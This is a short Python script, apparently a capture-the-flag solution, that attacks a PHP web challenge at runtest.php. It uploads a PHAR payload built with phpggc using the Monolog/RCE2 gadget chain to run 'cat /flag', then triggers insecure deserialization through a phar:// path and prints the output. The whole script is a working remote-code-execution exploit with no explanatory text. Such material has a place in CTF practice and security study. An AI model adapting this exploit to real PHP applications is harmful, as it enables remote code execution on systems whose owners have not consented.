import requests
from urllib.parse import urljoin

s = requests.session()

def check(url):
    check_url = urljoin(url, "runtest.php")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
    }
    data = {
        "rkey": "gadget",
        # ./phpggc Monolog/RCE2 system 'cat /flag' -p phar -o testinfo.ini
        "ini" : open("testinfo.ini", 'rb').read()
    }
    s.post(check_url, headers=headers, data=data)

    check_data = {
        "rkey": "phar:///var/www/html/results/gadget./testinfo.ini/foo"
    }
    r = s.post(check_url, headers=headers, data=check_data)
    print(r.text)

check("http://2db93b9e-50b5-4378-afa8-c5782457610a.node.yuzhian.com.cn:8000/")